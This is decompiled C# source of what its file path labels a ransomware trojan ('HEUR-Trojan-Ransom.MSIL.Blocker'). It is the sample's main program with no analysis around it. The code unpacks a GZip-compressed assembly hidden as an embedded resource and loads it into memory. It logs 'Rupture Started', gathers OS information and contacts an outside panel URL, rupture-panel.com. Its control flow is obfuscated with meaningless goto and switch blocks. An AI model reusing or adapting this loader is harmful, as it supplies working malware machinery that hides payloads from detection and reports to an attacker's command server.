// Decompiled with JetBrains decompiler
// Type: Iycqbslx.Program
// Assembly: SHNB83, Version=6.2.3.0, Culture=neutral, PublicKeyToken=null
// MVID: B8ADEC2C-652C-4F1A-AD72-03917C70995A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-2ff875c4fdfbf9f9644bc7ebc6c9532fc92e7bb9fa92aab2b1d3ecff09f9bb94.exe

using Iycqbslx.Properties;
using SHNB83.Listeners;
using SHNB83.Specifications;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Iycqbslx
{
  public static class Program
  {
    private static Program DisableUtils;

    [STAThread]
    private static void InterruptExporter()
    {
      try
      {
        DatabaseAdapterSpec.QueryExporter();
      }
      catch
      {
      }
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(Program.ConcatExporter);
      Tag.FlushExporter("Rupture Started");
      Tag.AssetExporter("Found OS information: {0}", DatabaseAdapterSpec.RateExporter());
      int num1 = 0;
      if (!Program.InterruptUtils())
        goto label_3;
label_1:
      switch (num1)
      {
        default:
          Exporter.SelectExporter("https://rupture-panel.com/");
          return;
      }
label_3:
      int num2;
      num1 = num2;
      goto label_1;
    }

    private static Assembly ConcatExporter(object value, ResolveEventArgs reg)
    {
      Assembly assembly;
      using (Stream stream = (Stream) Program.ViewUtils((object) Assembly.GetExecutingAssembly(), (object) (typeof (Program).Namespace + ".ClassLibrary1.dll")))
      {
        MemoryStream destination1 = new MemoryStream();
        stream.CopyTo((Stream) destination1);
        byte[] array;
        using (MemoryStream memoryStream = new MemoryStream(destination1.ToArray()))
        {
          using (MemoryStream destination2 = new MemoryStream())
          {
            using (BufferedStream bufferedStream = new BufferedStream((Stream) new GZipStream((Stream) memoryStream, CompressionMode.Decompress)))
              bufferedStream.CopyTo((Stream) destination2);
            array = destination2.ToArray();
          }
        }
        assembly = AppDomain.CurrentDomain.Load(array);
        int num1 = 0;
        if (Program.CallUtils() != null)
          goto label_17;
label_2:
        switch (num1)
        {
          default:
            goto label_21;
        }
label_17:
        int num2;
        num1 = num2;
        goto label_2;
      }
label_21:
      return assembly;
    }

    internal static bool InterruptUtils() => Program.DisableUtils == null;

    internal static Program CallUtils() => Program.DisableUtils;

    internal static object ViewUtils([In] object obj0, [In] object obj1) => (object) ((Assembly) obj0).GetManifestResourceStream((string) obj1);
  }
}
